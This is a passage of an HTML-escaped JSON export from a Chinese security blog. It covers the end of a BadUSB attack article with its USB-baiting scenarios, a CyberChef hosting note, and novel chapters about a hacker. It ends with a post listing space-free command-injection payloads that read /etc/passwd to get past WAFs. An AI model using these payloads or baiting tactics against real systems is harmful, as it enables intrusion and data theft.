defender。当然这种也并不保险。&lt;/li&gt;\n&lt;li&gt;对来历不明的usb设备，请慎重插入到电脑上（建议不插到电脑上）。&lt;/li&gt;\n&lt;li&gt;当然网络上也有设置组策略的方式进行阻止，以及禁用usb口来防御。这里具体看企业自身情况进行设置。具体配置方法自行搜索吧。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=\&#34;总结\&#34;&gt;总结&lt;/h2&gt;\n&lt;p&gt;Badusb的优点是杀毒软件无法查杀和拦截，但是其缺点也很明显，就是键盘输入的过程会在界面上有短暂的显示。每种攻击手法并不是万能的，只是一种手段，根据攻击场景不同，选择合适的攻击手段最终达到完美的攻击，这是我们所需要追求的。&lt;/p&gt;\n&lt;p&gt;关于Badusb的攻击这仅仅只是一种，还有更多的攻击方法，感兴趣的可以自行搜索学习。还有很多有趣的玩法。对于文中的问题，欢迎与我讨论交流。&lt;/p&gt;\n&lt;h2 id=\&#34;参考链接\&#34;&gt;参考链接&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;https://zhuanlan.zhihu.com/p/28194271&lt;/li&gt;\n&lt;li&gt;https://baike.baidu.com/item/USB-HID/3074554&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;&lt;strong&gt;注：本文仅做为研究，文中所提到的代码及攻击方式，仅用于企业内部安全测试与授权测试中。请勿将其用于非法渗透中，否则造成的一切后果与本人无关。&lt;/strong&gt;&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;Badusb-Attack-On-Mac-OSX&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;Badusb 已经出现了很多年，使用usb进行攻击的手段也从最初的利用autorun.inf、伪造文件夹名、快捷方式等手段转为更加难以防御的Badusb。这种攻击方式就是目前可绕过杀毒软件，防御较难。&lt;/p&gt;\n&lt;p&gt;&lt;a href=\&#34;https://www.youtube.com/embed/VdbTwopR4iY\&#34;&gt;点此打开&lt;/a&gt;观看一段演示视频，需fq。&lt;/p&gt;\n&lt;h2 id=\&#34;利用场景\&#34;&gt;利用场景&lt;/h2&gt;\n&lt;p&gt;说下本文中利用场景：&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;混入企业内部，员工电脑未锁屏的情况下。在之前去过很多客户那里，大多数企业的员工离开电脑前不锁屏的情况,而且非常严重。&lt;/li&gt;\n&lt;li&gt;对于无安全意识的员工进行攻击，如公司文员、前台、行政等，例如将usb贴上保密、照片等字样，并扔到显眼位置，以吸引人来捡并插入其电脑。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;针对Badusb攻击手段还有很多，利用场景也还有，这里仅列出与本文有关的部分。下面就让我们正式开始进入制作。&lt;/p&gt;\n&lt;h2 id=\&#34;准备工作\&#34;&gt;准备工作&lt;/h2&gt;\n&lt;h3 id=\&#34;硬件\&#34;&gt;硬件&lt;/h3&gt;\n&#34;,&#34;title&#34;:&#34;Badusb 攻击之MacOSX系统实战&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;badusb&#34;,&#34;slug&#34;:&#34;Bch1NxNuyXs&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/Bch1NxNuyXs/&#34;},{&#34;name&#34;:&#34;attack&#34;,&#34;slug&#34;:&#34;IdQuD9RcXgT&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/IdQuD9RcXgT/&#34;},{&#34;name&#34;:&#34;macos&#34;,&#34;slug&#34;:&#34;Z5-XZeQKgMs&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/Z5-XZeQKgMs/&#34;},{&#34;name&#34;:&#34;Arduino&#34;,&#34;slug&#34;:&#34;8eSYQ0PmfzY&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/8eSYQ0PmfzY/&#34;},{&#34;name&#34;:&#34;Leonardo&#34;,&#34;slug&#34;:&#34;KgFzGHPYxK5&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/KgFzGHPYxK5/&#34;},{&#34;name&#34;:&#34;mac osx&#34;,&#34;slug&#34;:&#34;qCd6SdL_hK5&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/qCd6SdL_hK5/&#34;}],&#34;date&#34;:&#34;2020-04-05 21:58:23&#34;,&#34;dateFormat&#34;:&#34;2020-04-05&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Badusb-Attack-On-Mac-OSX/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;7 min read&#34;,&#34;time&#34;:407000,&#34;words&#34;:1746,&#34;minutes&#34;:7},&#34;description&#34;:&#34;Badusb 已经出现了很多年，使用usb进行攻击的手段也从最初的利用autorun.inf、伪造文件夹名、快捷方式等手段转为更加难以防御的Badusb。这种攻击方式就是目前可绕过杀毒软件，防御较难。\n点此打开观看一段演示视频，需fq。\n利...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF\&#34;&gt;利用场景&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\&#34;&gt;准备工作&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%A1%AC%E4%BB%B6\&#34;&gt;硬件&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%BD%AF%E4%BB%B6\&#34;&gt;软件&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86\&#34;&gt;基础知识&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%AE%9E%E6%88%98%E6%94%BB%E5%87%BB\&#34;&gt;实战攻击&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#badusb%E9%98%B2%E5%BE%A1\&#34;&gt;Badusb防御&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%80%BB%E7%BB%93\&#34;&gt;总结&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5\&#34;&gt;参考链接&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;CyberChef是一个很好很强大的程序,很实用。&lt;/p&gt;\n&lt;p&gt;由于官方发布的线上地址使用了google统计，为了安全，还是自己搭建或者本地使用。本地就仅限于自己的电脑才可使用。所以搭建自己线上的可以随时使用，方便许多。同时配合Open in CyberChef这个浏览器插件就更加方便。&lt;/p&gt;\n&lt;p&gt;直接下载官方生成的包，下载地址：&lt;a href=\&#34;https://github.com/gchq/CyberChef/releases\&#34;&gt;https://github.com/gchq/CyberChef/releases&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;我这里直接上传到github，并且启用github pages。然后绑定解析自己的域名即可线上访问。我这里搭建好的无google统计的地址：&lt;a href=\&#34;https://cyberchef.bacde.me\&#34;&gt;https://cyberchef.bacde.me&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;接下来安装Open in CyberChef 这个chrome插件。插件地址:&lt;a href=\&#34;https://chrome.google.com/webstore/detail/open-in-cyberchef/aandeoaihmciockajcgadkgknejppjdl/related\&#34;&gt;https://chrome.google.com/webstore/detail/open-in-cyberchef/aandeoaihmciockajcgadkgknejppjdl/related&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;这样就可以直接右键发送到自己的cyberchef，方便了很多。使用效果如下：&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1585901306155.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;2\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1585901514463.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;3\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1585901579171.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&#34;,&#34;fileName&#34;:&#34;build-own-cyberchef&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;CyberChef是一个很好很强大的程序,很实用。&lt;/p&gt;\n&lt;p&gt;由于官方发布的线上地址使用了google统计，为了安全，还是自己搭建或者本地使用。本地就仅限于自己的电脑才可使用。所以搭建自己线上的可以随时使用，方便许多。同时配合Open in CyberChef这个浏览器插件就更加方便。&lt;/p&gt;\n&lt;p&gt;直接下载官方生成的包，下载地址：&lt;a href=\&#34;https://github.com/gchq/CyberChef/releases\&#34;&gt;https://github.com/gchq/CyberChef/releases&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;我这里直接上传到github，并且启用github pages。然后绑定解析自己的域名即可线上访问。我这里搭建好的无google统计的地址：&lt;a href=\&#34;https://cyberchef.bacde.me\&#34;&gt;https://cyberchef.bacde.me&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;接下来安装Open in CyberChef 这个chrome插件。插件地址:&lt;a href=\&#34;https://chrome.google.com/webstore/detail/open-in-cyberchef/aandeoaihmciockajcgadkgknejppjdl/related\&#34;&gt;https://chrome.google.com/webstore/detail/open-in-cyberchef/aandeoaihmciockajcgadkgknejppjdl/related&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;这样就可以直接右键发送到自己的cyberchef，方便了很多。使用效果如下：&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;搭建自己的CyberChef&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;cyberchef&#34;,&#34;slug&#34;:&#34;ghh6guaE76j&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/ghh6guaE76j/&#34;},{&#34;name&#34;:&#34;decode&#34;,&#34;slug&#34;:&#34;_gyskx7-lzv&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/_gyskx7-lzv/&#34;},{&#34;name&#34;:&#34;tool&#34;,&#34;slug&#34;:&#34;LsoPWtuzh-h&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/LsoPWtuzh-h/&#34;},{&#34;name&#34;:&#34;tools&#34;,&#34;slug&#34;:&#34;3V8i5w4Y5an&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/3V8i5w4Y5an/&#34;}],&#34;date&#34;:&#34;2020-04-03 15:58:37&#34;,&#34;dateFormat&#34;:&#34;2020-04-03&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/build-own-cyberchef/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:51000,&#34;words&#34;:226,&#34;minutes&#34;:1},&#34;description&#34;:&#34;CyberChef是一个很好很强大的程序,很实用。\n由于官方发布的线上地址使用了google统计，为了安全，还是自己搭建或者本地使用。本地就仅限于自己的电脑才可使用。所以搭建自己线上的可以随时使用，方便许多。同时配合Open in Cybe...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;!-- more --&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1585885276203.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;PDF下载地址：&lt;a href=\&#34;https://drive.google.com/file/d/1p83ButiuItmvEyi_JAEVqEQ-AYYnLsb2/view?fbclid=IwAR3wQErPrAMcP_Md0m1IEO7qbquEE8jawwcpbp3ajpIuOoUievUGrDkbfWs\&#34;&gt;https://drive.google.com/file/d/1p83ButiuItmvEyi_JAEVqEQ-AYYnLsb2/view?fbclid=IwAR3wQErPrAMcP_Md0m1IEO7qbquEE8jawwcpbp3ajpIuOoUievUGrDkbfWs&lt;/a&gt;&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;hunting-tips-mindmap&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;Hunting Tips Mindmap&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;漏洞挖掘&#34;,&#34;slug&#34;:&#34;1DaHDVCRSr&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/1DaHDVCRSr/&#34;},{&#34;name&#34;:&#34;hunter&#34;,&#34;slug&#34;:&#34;yXyTIlAVTRx&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/yXyTIlAVTRx/&#34;},{&#34;name&#34;:&#34;tips&#34;,&#34;slug&#34;:&#34;8pBIONj51ua&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/8pBIONj51ua/&#34;}],&#34;date&#34;:&#34;2020-04-03 11:29:17&#34;,&#34;dateFormat&#34;:&#34;2020-04-03&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/hunting-tips-mindmap/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:5000,&#34;words&#34;:16,&#34;minutes&#34;:1},&#34;description&#34;:&#34;\n\nPDF下载地址：https://drive.google.com/file/d/1p83ButiuItmvEyi_JAEVqEQ-AYYnLsb2/view?fbclid=IwAR3wQErPrAMcP_Md0m1IEO7qbquEE8...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;pre&gt;&lt;code&gt;人生比地狱还像地狱。\n——芥川龙之介 《罗生门》\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;疫情之下，疾病面前，所有人都是平等的。无论你是谁，都有被感染的风险。等待病人的是死亡，因为病毒正在一点一点的无情摧毁着病人的防御系统。&lt;/p&gt;\n&lt;p&gt;王梓很不幸，在到达小镇的几天内，他就开始感受到了全身的不舒服，症状与报道种的症状无例外。他很痛苦，但他的内心还仍然想着那未完成的事，那个真相。&lt;/p&gt;\n&lt;p&gt;他已经没有什么力气，他无法在操作电脑，在现实世界，他没有了电脑，没有了电子产品，他变得普通到不能在普通。而多年的熬夜，不规律，是他的身体免疫特别查，尽管不久前开始练习太极拳，但是，这么短的时间他还没有增强太多。&lt;/p&gt;\n&lt;p&gt;等待他的是死亡，死神正一点一点的靠近他。他想起了小楠，想起了他们在一起的日子。或许，如果人生让他重来的话，他不在选择生活在黑暗中。一切都已经晚了，人生没有重启键，无法重新来过。结局早已经在当初的选择时就已经注定。&lt;/p&gt;\n&lt;p&gt;再见了，世界！&lt;/p&gt;\n&lt;p&gt;就这样，王梓带着他所知道的秘密离开了这个世界。世界上其他的人仍然还在继续忙碌着，在寻找他。&lt;/p&gt;\n&lt;p&gt;（完）&lt;/p&gt;\n&lt;p&gt;草草的完结了不算小说的小说，最近反复读了多遍，自己感觉已经无法写下去了。计划对小说重新进行构思。或许还会有下一步真正意义上的小说。谢谢大家！&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;Killer-Chapter-Twelve&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;原创小说《杀手》第十二章 疫情之下（完）&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;小说&#34;,&#34;slug&#34;:&#34;CxFvcMcMqY5&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/CxFvcMcMqY5/&#34;},{&#34;name&#34;:&#34;novel&#34;,&#34;slug&#34;:&#34;JJyH5v-0vnk&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/JJyH5v-0vnk/&#34;}],&#34;date&#34;:&#34;2020-03-30 13:13:34&#34;,&#34;dateFormat&#34;:&#34;2020-03-30&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Killer-Chapter-Twelve/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;2 min read&#34;,&#34;time&#34;:88000,&#34;words&#34;:440,&#34;minutes&#34;:2},&#34;description&#34;:&#34;人生比地狱还像地狱。\n——芥川龙之介 《罗生门》\n\n疫情之下，疾病面前，所有人都是平等的。无论你是谁，都有被感染的风险。等待病人的是死亡，因为病毒正在一点一点的无情摧毁着病人的防御系统。\n王梓很不幸，在到达小镇的几天内，他就开始感受到了全身...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;pre&gt;&lt;code&gt;真正的牢狱是恐惧\n而真正的自由是\n免于恐惧的自由\n            ——昂山素季\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&#34;北京下雪了\&#34;&gt;北京，下雪了&lt;/h2&gt;\n&lt;p&gt;近几年北京下雪的场景比较罕见，不过今年似乎是个以外，这已经是北京的第三场雪了。而中国最传统的节日——春节也即将到来。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1585023705115.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;王梓坐在不知通往哪里的车，看着窗外的大雪，回忆起了10年前的冬天：同样是下雪天，而他穿着单薄的衣服，刚刚从网吧里出来。而此时的他已经没有钱了。因为经常来这家网吧，他跟网吧的老板比较熟，他曾经跟老板商量，能不能赊账。当时网吧老板直接就给拒绝了，并摆出了一副没有商量的姿态。网吧老板知道王梓的父亲跟母亲离婚，而父亲整日无所事事，只会到处去骗点钱，然后买酒，赌博。10年前的王梓还在上初中，整天不好好学习，沉迷于网络游戏中，但是因为穷，父亲给的钱不多，也没多少时间上网。每次从网吧出来都要走着回家。&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;一阵阵的风吹过，王梓又收了收紧自己的衣服。他心想着：“我得找个地方暖暖”。他加快了脚步，同时在看附近有没有可以不要钱又能暖和的地方，而他也很幸运的发现了一家小书店，书店名叫三联书店。他什么都没想就朝着书店走去。推开了门，“叮铃～”，一个清脆的声音从王梓头上发出。屋子里很暖合，面积不大，一共只有四排书架，还有一些书被平放在长长的桌子上，右侧的收银妹子正在忙着，其他还有几个在选书的男男女女，买书的人也不多。而此时王梓已经从寒冷中缓了过来。他开始漫无目的乱看。这家书店卖的大多数都是杂志，很全，什么种类的都有，除了常见的《意林》、《故事会》外，还有科技类，车类，军事类、时尚类。而映入王梓眼帘的有几个大字，上面写着“黑客x档案”，而在杂志的封面，王梓注意到了一个标题“教你如何在网吧免费上网”。王梓的兴趣来了，拿起了书读起来。因为没钱买，他特意看了两遍，把杂志中的步骤记下来了。外面的雪还没有停，王梓便翻了翻其他的文章，看了一会，发现其他的完全看不懂。不过他了解到了网络中有一种身份是黑客，而这本杂志讲述了黑客技术，可以教会别人怎么去入侵别人的网站，怎么获得免费的东西，怎么去盗取别人的账号密码等。他又看了看，还是看不懂，他想，算了，先试试免费上网。&lt;/p&gt;\n&lt;p&gt;第二天，他拿着几块钱，来到一家新的网吧，打算尝试新学会的技能，他只押1个小时的钱。开始按照书中的内容操作，因为要等待到时间了才能知道成功不成功。王梓也不想打游戏了，完全被前一天看到的内容所吸引。他想搞明白昨天看的那些到底是什么，他开始在网络中寻找这些相关的资料。时间过的很快，1个小时过去了。他的机器没有被锁住，还可以继续上网。此时的他内心中有一点点害怕，但同时也是兴奋的。他成功了逃过了网吧的计费软件，免费上网了。那个免费上网方法原来很简单，因为网吧计费软件使用了ipx的协议进行通信，而王梓那时候逃过计费软件仅仅只是通过禁用该协议来让网吧的计费控制端不能给他的机器发送锁屏，关机等指令。当时对刚入门的王梓来说，那可是相当的神奇。当然这种方法在现在已经不管用了。后来他去以前经常去的那家网吧，学会了破解了网吧客户端的密码，以管理员身份上网。而在不久后，他又学会了用啊d网络工具包入侵网吧计费电脑来给自己改钱。不过因为初出茅庐，次数多了就被网管发现，被警告，被赶出过网吧。不过，他享受着。或许也是因为这刚开始小小的成功，他对黑客的兴趣也更加浓烈，也是因为此，如今的他成了一名职业黑客。&lt;/p&gt;\n&lt;p&gt;车停下了，王梓背起包走下车。这是一个小镇，因为临近春节，大街小巷的路灯都挂满了红彤彤的灯笼，小镇显得格外的热闹。春节是一个家人团聚的节日，而对于王梓来说，他就是家，他在哪里家就在哪里。小镇四处转转，其实他是在熟悉地形。找了视野比较好的地方，在附近租了一间房子，这便是安顿下来了。打开了电脑。点开了留言：“你失信了！东西在哪里？交出来！不然你会很危险！”&lt;/p&gt;\n&lt;p&gt;王梓最讨厌的就是背叛和威胁，这个单子，让他陷入如此的境遇。王梓所向往的自由还很远。他不去理会，而是看看最近网络新闻，最近大多数消息都开始围绕一种新型冠状病毒，随着报道越来越多，以及病例数也逐渐增多。一时间全国各地的药店，口罩和消毒水卖到脱销。王梓也赶紧买了一些。接下来的日子王梓要想办法过上正常生活，他再次打开电脑，并给对方回复：“你违背了我的交易原则，不与政府有任何关系。作为惩罚，你们的钱我扣下了”。发完消息后，他收起电脑。该好好休息下了。&lt;/p&gt;\n&lt;p&gt;王梓做了一个梦：“一个阳光明媚的午后，王梓在街上走着，小楠出现在了不远处向他走来，阳光从侧上方照射到了小楠身上，小楠的身后就像发着光，一阵风吹过她的秀发，飘起，微微一笑。王梓也不自觉的笑起来。小楠美极了。突然，一阵刹车声，一辆车停下，几个人下车，迅速的跑向小楠，把小楠抓到了车上。而此时的王梓想要去追上去，却追不上去，车子离的越来越远。很快的，王梓听到小楠的哭泣声，救我～救我～，小楠被绑在一个椅子上，眼睛被封住。旁边有人拿了一把刀架在她的脖子上。有一个中年人在视频中对王梓说，看到她了吧，在我们这里，你赶快现身，不然我们做出什么事情。说着刀子又下去了一点，小楠的脖子开始从刀子上流出一点点鲜血。王梓大声喊：不要，不要，你们在哪里，我去，快她放了。”&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;2\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1585023384199.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;“不要……”王梓从梦中惊醒。满头大汗，此时房间内四周都很安静，什么都没有发生。他去客厅倒了一杯数，深吸了一口气，让自己平静下来。&lt;/p&gt;\n&lt;p&gt;（未完待续）&lt;/p&gt;\n&lt;h2 id=\&#34;黑客兵器谱\&#34;&gt;黑客兵器谱&lt;/h2&gt;\n&lt;p&gt;啊d网络工具包：一款网络工具包，有很多入侵功能，文中提到的是利用木马种植器功能，配合pcshare控制了网吧的电脑（亲身经历过的）。当然还有其他的功能如端口探测等，目标发现，共享扫描等功能。在以前idc没有过滤139，135这类端口对外网也是有效果的。&lt;/p&gt;\n&lt;h2 id=\&#34;小知识\&#34;&gt;小知识&lt;/h2&gt;\n&lt;p&gt;文中所说的免费上网原理其实已经交代明白了，因为都已经失效了，所以不再重复了。而获取网吧客户端的密码直接使用读取的软件就可以读出来了。&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;Killer-Chapter-Eleven&#34;,&#34;abstract&#34;:&#34;&lt;pre&gt;&lt;code&gt;真正的牢狱是恐惧\n而真正的自由是\n免于恐惧的自由\n            ——昂山素季\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&#34;北京下雪了\&#34;&gt;北京，下雪了&lt;/h2&gt;\n&lt;p&gt;近几年北京下雪的场景比较罕见，不过今年似乎是个以外，这已经是北京的第三场雪了。而中国最传统的节日——春节也即将到来。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1585023705115.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;王梓坐在不知通往哪里的车，看着窗外的大雪，回忆起了10年前的冬天：同样是下雪天，而他穿着单薄的衣服，刚刚从网吧里出来。而此时的他已经没有钱了。因为经常来这家网吧，他跟网吧的老板比较熟，他曾经跟老板商量，能不能赊账。当时网吧老板直接就给拒绝了，并摆出了一副没有商量的姿态。网吧老板知道王梓的父亲跟母亲离婚，而父亲整日无所事事，只会到处去骗点钱，然后买酒，赌博。10年前的王梓还在上初中，整天不好好学习，沉迷于网络游戏中，但是因为穷，父亲给的钱不多，也没多少时间上网。每次从网吧出来都要走着回家。&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;原创小说《杀手》第十一章 自由&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;小说&#34;,&#34;slug&#34;:&#34;CxFvcMcMqY5&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/CxFvcMcMqY5/&#34;},{&#34;name&#34;:&#34;novel&#34;,&#34;slug&#34;:&#34;JJyH5v-0vnk&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/JJyH5v-0vnk/&#34;},{&#34;name&#34;:&#34;啊D网络工具包&#34;,&#34;slug&#34;:&#34;NKbd_2m6YIj&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/NKbd_2m6YIj/&#34;}],&#34;date&#34;:&#34;2020-03-22 19:54:20&#34;,&#34;dateFormat&#34;:&#34;2020-03-22&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Killer-Chapter-Eleven/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;7 min read&#34;,&#34;time&#34;:415000,&#34;words&#34;:2070,&#34;minutes&#34;:7},&#34;description&#34;:&#34;真正的牢狱是恐惧\n而真正的自由是\n免于恐惧的自由\n            ——昂山素季\n\n北京，下雪了\n近几年北京下雪的场景比较罕见，不过今年似乎是个以外，这已经是北京的第三场雪了。而中国最传统的节日——春节也即将到来。\n\n王梓坐在不知通往...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%8C%97%E4%BA%AC%E4%B8%8B%E9%9B%AA%E4%BA%86\&#34;&gt;北京，下雪了&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E9%BB%91%E5%AE%A2%E5%85%B5%E5%99%A8%E8%B0%B1\&#34;&gt;黑客兵器谱&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%B0%8F%E7%9F%A5%E8%AF%86\&#34;&gt;小知识&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;在一些漏洞利用场景，或者因为waf等原因，导致无法使用空格时，可以试试如下命令：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;IFS=,;`cat&amp;lt;&amp;lt;&amp;lt;cat,/etc/passwd` \ncat$IFS/etc/passwd \ncat${IFS}/etc/passwd \ncat&amp;lt;/etc/passwd \n{cat,/etc/passwd} \nX=$&#39;cat\\x20/etc/passwd&#39;&amp;amp;&amp;amp;$X\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;经过测试，除最后一条在mac osx下执行失败，这些命令在ubuntu 19.10和centos7下均执行成功。在mac osx系统下系统会将cat\\x20/etc/passwd当成一个可执行文件，会提示No such file or directory。&lt;/p&gt;\n&lt;p&gt;来源：&lt;a href=\&#34;https://twitter.com/omespino/status/1241544334329208838\&#34;&gt;https://twitter.com/omespino/status/1241544334329208838&lt;/a&gt;&lt;/p&gt;\n&lt;!-- more --&gt;\n&#34;,&#34;fileName&#34;:&#34;bashtricks-execute-commands-without-space&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;在一些漏洞利用场景，或者因为waf等原因，导致无法使用空格时，可以试试如下命令：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;IFS=,;`cat&amp;lt;&amp;lt;&amp;lt;cat,/etc/passwd` \ncat$IFS/etc/passwd \ncat${IFS}/etc/passwd \ncat&amp;lt;/etc/passwd \n{cat,/etc/passwd} \nX=$&#39;cat\\x20/etc/passwd&#39;&amp;amp;&amp;amp;$X\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;经过测试，除最后一条在mac osx下执行失败，这些命令在ubuntu 19.10和centos7下均执行成功。在mac osx系统下系统会将cat\\x20/etc/passwd当成一个可执行文件，会提示No such file or directory。&lt;/p&gt;\n&lt;p&gt;来源：&lt;a href=\&#34;https://twitter.com/omespino/status/1241544334329208838\&#34;&gt;https://twitter.com/omespino/status/1241544334329208838&lt;/a&gt;&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;bashtricks 